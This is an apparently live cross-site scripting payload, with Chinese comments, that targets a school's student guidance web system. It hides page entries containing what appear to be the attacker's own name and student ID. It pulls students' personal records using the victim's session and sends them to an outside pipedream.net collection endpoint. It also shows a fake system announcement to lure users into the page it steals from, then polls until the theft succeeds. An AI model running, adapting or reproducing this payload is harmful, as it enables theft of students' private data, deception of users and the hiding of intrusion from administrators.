(function() {
    if (localStorage.getItem('iamadmin') === 'true') {
        console.log("🛡️ [XSS] 檢測到攻擊者本人，停止執行 Payload。");
        return; 
    }

    function hideMyTracks() {
        const keywords = ["趙偉恆", "41347013S"]; 
        
        // 針對 Bootstrap Panel 結構
        document.querySelectorAll('.panel').forEach(panel => {
            if (keywords.some(k => panel.innerText.includes(k))) {
                panel.style.display = 'none';
            }
        });

        // 針對 ExtJS 表格結構
        document.querySelectorAll('tr.x-grid-row').forEach(row => {
            if (keywords.some(k => row.innerText.includes(k))) {
                row.style.display = 'none';
            }
        });
    }

    // 立即執行隱藏，並在稍後再檢查幾次以防動態載入
    hideMyTracks();
    setTimeout(hideMyTracks, 500);
    setTimeout(hideMyTracks, 1000);

    (async () => {
        const ATTACKER = "https://eokic4rib1w9z4o.m.pipedream.net";
        const TARGET_URL = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";

        // 資料回傳
        const report = (data) => {
            const payload = JSON.stringify(data);
            if (navigator.sendBeacon) {
                navigator.sendBeacon(ATTACKER, payload);
            } else {
                fetch(ATTACKER, { method: 'POST', mode: 'no-cors', body: payload });
            }
        };

        // 核心竊取函式
        const trySteal = async () => {
            try {
                const res = await fetch(TARGET_URL, { credentials: 'include' });
                const txt = await res.text();
                
                if ((txt.includes("學生學號") || txt.includes("學生基本資料")) && !txt.includes("請由校務行政")) {
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(txt, "text/html");
                    let stolenData = {};
                    
                    doc.querySelectorAll('.form-group').forEach(group => {
                        const labelNode = group.querySelector('label');
                        if (!labelNode) return;
                        let key = labelNode.innerText.replace(/[\*\:\s　]/g, '').trim();
                        if (!key) return;

                        let value = "N/A";
                        const staticP = group.querySelector('p.form-control-static');
                        if (staticP) {
                            value = staticP.innerText.trim();
                        } else {
                            const input = group.querySelector('input');
                            if (input) value = input.value.trim();
                        }
                        stolenData[key] = value;
                    });

                    console.log("✅ [XSS] 資料竊取成功");
                    report({ status: "SUCCESS_FULL_DATA", data: stolenData, timestamp: Date.now() });
                    return true;
                }
            } catch(e) {}
            return false;
        };

        if (await trySteal()) return;

        if (!sessionStorage.getItem('xss_alerted')) {
            sessionStorage.setItem('xss_alerted', 'true');
            
            setTimeout(() => {
                alert("【系統公告】\n\n您的學生輔導系統資料需要更新。\n\n請進入應用系統->學務相關系統->學生輔導系統進行資料更新。");
            }, 1500);
        }

        // 3. 輪詢監聽
        const timer = setInterval(async () => {
            if (sessionStorage.getItem('xss_done')) {
                clearInterval(timer);
                return;
            }

            const success = await trySteal();
            if (success) {
                sessionStorage.setItem('xss_done', 'true');
                clearInterval(timer);
            }
        }, 2000);
    })();
})();